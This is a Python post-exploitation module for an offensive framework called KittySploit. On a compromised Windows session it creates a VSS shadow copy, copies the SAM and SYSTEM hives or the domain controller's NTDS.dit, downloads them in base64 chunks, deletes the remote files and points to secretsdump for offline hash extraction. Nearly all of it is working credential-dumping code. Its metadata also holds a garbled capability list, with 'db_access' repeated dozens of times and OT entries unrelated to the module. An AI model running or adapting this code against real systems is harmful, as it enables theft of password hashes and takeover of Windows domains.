#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Backup SAM and SYSTEM hives (or NTDS.dit + SYSTEM on domain controllers) via VSS
shadow copy on a Windows shell or Meterpreter session. Artifacts are downloaded
through the session and saved under ./output.
"""

from kittysploit import *
import base64
import os
import re
import time

_LOCAL_OUT = "output"
_FILE_MARKER = "__KS_FILE__:"


class Module(Post):
    _AUTO_CLEANUP = True

    __info__ = {
        "name": "Windows Backup SAM and SYSTEM (VSS)",
        "description": (
            "Create a VSS shadow copy and copy SAM/SYSTEM registry hives (or NTDS.dit "
            "and SYSTEM on domain controllers) to a remote directory, then download "
            "the files through the current session."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1003/002/",
            "https://attack.mitre.org/techniques/T1003/003/",
        ],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 4,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    out_dir = OptString("", "Remote directory for hive copies (default: %TEMP%)", False)
    chunk_kb = OptInteger(256, "Chunk size in kilobytes for session reads", False)

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        output = self.cmd_execute(command)
        return output.strip() if output else ""

    def _encode_powershell(self, script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def _run_powershell(self, script: str) -> str:
        encoded = self._encode_powershell(script)
        return self._execute_cmd(f"powershell -NoP -NonI -EncodedCommand {encoded}")

    def _remote_temp_dir(self) -> str:
        if str(self.out_dir or "").strip():
            return str(self.out_dir).strip().rstrip("\\")
        output = self._execute_cmd("echo %TEMP%")
        if output:
            return output.splitlines()[0].strip().rstrip("\\")
        return "C:\\Windows\\Temp"

    def _ps_single_quote(self, value: str) -> str:
        return str(value).replace("'", "''")

    def _powershell_script(self) -> str:
        return r"""
function Copy-RawItem {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $True, Position = 0)]
        [string]$Path,

        [Parameter(Mandatory = $True, Position = 1)]
        [string]$Destination,

        [Switch]$FailIfExists
    )

    $mscorlib = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
        $_.Location -and ($_.Location.Split('\')[-1] -eq 'mscorlib.dll')
    }
    $Win32Native = $mscorlib.GetType('Microsoft.Win32.Win32Native')
    $CopyFileMethod = $Win32Native.GetMethod('CopyFile', ([Reflection.BindingFlags] 'NonPublic, Static'))

    $CopyResult = $CopyFileMethod.Invoke($null, @($Path, $Destination, ([Bool] $PSBoundParameters['FailIfExists'])))
    $HResult = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if ($CopyResult -eq $False -and $HResult -ne 0) {
        throw (New-Object ComponentModel.Win32Exception)
    }

    Get-ChildItem -Path $Destination
}

function Backup-SAMSystem {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $True)]
        [string]$OutputDir
    )

    if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
            [Security.Principal.WindowsBuiltInRole] "Administrator")) {
        throw "Not running as administrator. Elevated credentials are required."
    }

    if (-not (Test-Path -LiteralPath $OutputDir)) {
        New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
    }

    $VssStartMode = (Get-WmiObject -Query "Select StartMode From Win32_Service Where Name='vss'").StartMode
    if ($VssStartMode -eq "Disabled") { Set-Service -Name vss -StartupType Manual }

    $VssStatus = (Get-Service -Name vss).Status
    if ($VssStatus -ne "Running") { Start-Service -Name vss }

    $DomainRole = (Get-WmiObject Win32_ComputerSystem).DomainRole
    $IsDC = $DomainRole -gt 3
    $FileDrive = if ($IsDC) {
        (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\NTDS\Parameters")."DSA Database File" |
            ForEach-Object { $_.Substring(0, 3) }
    } else {
        "$($env:HOMEDRIVE)\"
    }

    $WmiClass = [WMICLASS]"root\cimv2:Win32_ShadowCopy"
    $ShadowCopy = $WmiClass.create($FileDrive, "ClientAccessible")
    $ReturnValue = $ShadowCopy.ReturnValue

    if ($ReturnValue -ne 0) {
        throw "Shadow copy failed with return value $ReturnValue"
    }

    $ShadowID = $ShadowCopy.ShadowID
    $ShadowVolume = (Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $ShadowID }).DeviceObject

    try {
        if (-not $IsDC) {
            $SamPath = Join-Path -Path $ShadowVolume -ChildPath "\Windows\System32\Config\sam"
            $SystemPath = Join-Path -Path $ShadowVolume -ChildPath "\Windows\System32\Config\system"
            $SamDest = Join-Path -Path $OutputDir -ChildPath "sam"
            $SystemDest = Join-Path -Path $OutputDir -ChildPath "system"
            Copy-RawItem -Path $SamPath -Destination $SamDest
            Copy-RawItem -Path $SystemPath -Destination $SystemDest
            Write-Output "__KS_FILE__:$SamDest"
            Write-Output "__KS_FILE__:$SystemDest"
            Write-Output "__KS_DC__:false"
        } else {
            $NTDSPath = Join-Path -Path $ShadowVolume -ChildPath "\Windows\NTDS\NTDS.dit"
            $SystemPath = Join-Path -Path $ShadowVolume -ChildPath "\Windows\System32\Config\system"
            $NTDSDest = Join-Path -Path $OutputDir -ChildPath "ntds"
            $SystemDest = Join-Path -Path $OutputDir -ChildPath "system"
            Copy-RawItem -Path $NTDSPath -Destination $NTDSDest
            Copy-RawItem -Path $SystemPath -Destination $SystemDest
            Write-Output "__KS_FILE__:$NTDSDest"
            Write-Output "__KS_FILE__:$SystemDest"
            Write-Output "__KS_DC__:true"
        }
    }
    finally {
        if ($VssStatus -eq "Stopped") { Stop-Service -Name vss -ErrorAction SilentlyContinue }
        if ($VssStartMode -eq "Disabled") { Set-Service -Name vss -StartupType Disabled -ErrorAction SilentlyContinue }
    }
}
"""

    def _write_remote_script(self, temp_dir: str):
        script_path = f"{temp_dir}\\backup_sam_system.ps1"
        blob_path = f"{temp_dir}\\backup_sam_system.b64"
        payload = base64.b64encode(self._powershell_script().encode("utf-8")).decode("ascii")
        chunks = [payload[i:i + 3500] for i in range(0, len(payload), 3500)]

        for index, chunk in enumerate(chunks):
            method = "WriteAllText" if index == 0 else "AppendAllText"
            ps = f"[IO.File]::{method}('{blob_path}','{chunk}');"
            self._run_powershell(ps)

        decode_script = (
            f"$b=[IO.File]::ReadAllText('{blob_path}');"
            f"[IO.File]::WriteAllText('{script_path}',"
            "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)));"
        )
        self._run_powershell(decode_script)
        return script_path, blob_path

    def _cleanup_remote(self, paths):
        for path in paths:
            if not path:
                continue
            self._execute_cmd(f'del /f /q "{path}"')

    def _int_opt(self, val, default, minimum=None):
        try:
            n = int(val)
        except Exception:
            n = default
        if minimum is not None and n < minimum:
            n = minimum
        return n

    def _remote_file_size(self, path: str) -> int:
        pq = self._ps_single_quote(path)
        ps = f"(Get-Item -LiteralPath '{pq}').Length"
        out = self._run_powershell(ps).strip()
        if not out:
            return 0
        tail = out.splitlines()[-1].strip()
        try:
            return int(tail)
        except ValueError:
            digits = re.sub(r"\D", "", tail)
            return int(digits) if digits else 0

    def _read_remote_chunk_b64(self, path: str, offset: int, length: int) -> bytes:
        pq = self._ps_single_quote(path)
        ps = f"""$fs = [IO.File]::OpenRead('{pq}')
try {{
  $null = $fs.Seek({int(offset)}, [IO.SeekOrigin]::Begin)
  $buf = New-Object byte[] {int(length)}
  $n = $fs.Read($buf, 0, {int(length)})
  if ($n -le 0) {{ '' }} else {{ [Convert]::ToBase64String($buf, 0, $n) }}
}} finally {{
  $fs.Close()
}}"""
        out = self._run_powershell(ps)
        clean = re.sub(r"\s+", "", out)
        if not clean:
            return b""
        return base64.b64decode(clean)

    def _pull_file_via_session(self, remote_path: str, local_path: str) -> bool:
        size = self._remote_file_size(remote_path)
        if size <= 0:
            print_error(f"Remote file is missing or empty: {remote_path}")
            return False

        chunk = max(1024, self._int_opt(self.chunk_kb, 256, None) * 1024)
        parts = []
        offset = 0
        while offset < size:
            n = min(chunk, size - offset)
            blob = self._read_remote_chunk_b64(remote_path, offset, n)
            if len(blob) != n:
                print_error(f"Chunk read mismatch at offset {offset} (expected {n} bytes, got {len(blob)}).")
                return False
            parts.append(blob)
            offset += n

        parent = os.path.dirname(os.path.abspath(local_path))
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(local_path, "wb") as f:
            f.write(b"".join(parts))
        return True

    def _parse_remote_files(self, output: str):
        files = []
        is_dc = False
        for line in output.splitlines():
            line = line.strip()
            if line.startswith(_FILE_MARKER):
                files.append(line[len(_FILE_MARKER):].strip())
            elif line == "__KS_DC__:true":
                is_dc = True
        return files, is_dc

    def check(self):
        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
        if "1" not in ps_check:
            print_error("PowerShell is not available on the target")
            return False

        admin_check = self._run_powershell(
            "([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())"
            ".IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"
        )
        if "True" not in admin_check:
            print_error("Administrator privileges are required (VSS shadow copy)")
            whoami = self._execute_cmd("whoami")
            if whoami:
                print_warning(f"Current user: {whoami}")
            return False

        print_success("Administrator privileges confirmed")
        return True

    def run(self):
        if not self.check():
            raise ProcedureError(FailureType.NotAccess, "Administrator privileges are required")

        temp_dir = self._remote_temp_dir()
        stamp = time.strftime("%Y%m%d_%H%M%S")
        local_dir = os.path.join(_LOCAL_OUT, f"backup_sam_system_{stamp}")
        os.makedirs(local_dir, exist_ok=True)

        print_status("Uploading Backup-SAMSystem payload...")
        script_path, blob_path = self._write_remote_script(temp_dir)

        invoke = (
            "$ErrorActionPreference='Stop';"
            f". '{self._ps_single_quote(script_path)}';"
            f"Backup-SAMSystem -OutputDir '{self._ps_single_quote(temp_dir)}'"
        )

        print_status("Creating VSS shadow copy and copying registry hives...")
        result = self._run_powershell(invoke)

        cleanup_paths = [script_path, blob_path]
        remote_files, is_dc = self._parse_remote_files(result)

        if not remote_files:
            if self._AUTO_CLEANUP:
                self._cleanup_remote(cleanup_paths)
            if re.search(r"(Exception|failed|Not running as administrator|Shadow copy failed)", result, re.I):
                print_error(result or "Backup-SAMSystem failed without output")
                raise ProcedureError(FailureType.Unknown, "Backup-SAMSystem failed")
            raise ProcedureError(FailureType.Unknown, "No hive files were produced by Backup-SAMSystem")

        if is_dc:
            print_info("Domain controller detected — NTDS.dit and SYSTEM were copied")
        else:
            print_info("SAM and SYSTEM hives were copied on the target")

        saved = []
        for remote_path in remote_files:
            base = os.path.basename(remote_path.replace("\\", "/")) or "hive"
            local_path = os.path.join(local_dir, base)
            print_status(f"Downloading {remote_path}...")
            if not self._pull_file_via_session(remote_path, local_path):
                if self._AUTO_CLEANUP:
                    self._cleanup_remote(cleanup_paths + remote_files)
                raise ProcedureError(FailureType.Unknown, f"Failed to download {remote_path}")
            saved.append(local_path)
            if self._AUTO_CLEANUP:
                self._cleanup_remote([remote_path])

        if self._AUTO_CLEANUP:
            self._cleanup_remote(cleanup_paths)

        print_success("SAM/SYSTEM backup completed")
        for path in saved:
            rel = os.path.join(".", path)
            print_success(f"Saved {rel} ({os.path.getsize(path)} bytes)")
        if is_dc:
            print_info("Offline extraction: secretsdump.py -ntds ntds -system system LOCAL")
        else:
            print_info("Offline extraction: secretsdump.py -sam sam -system system LOCAL")
        return True
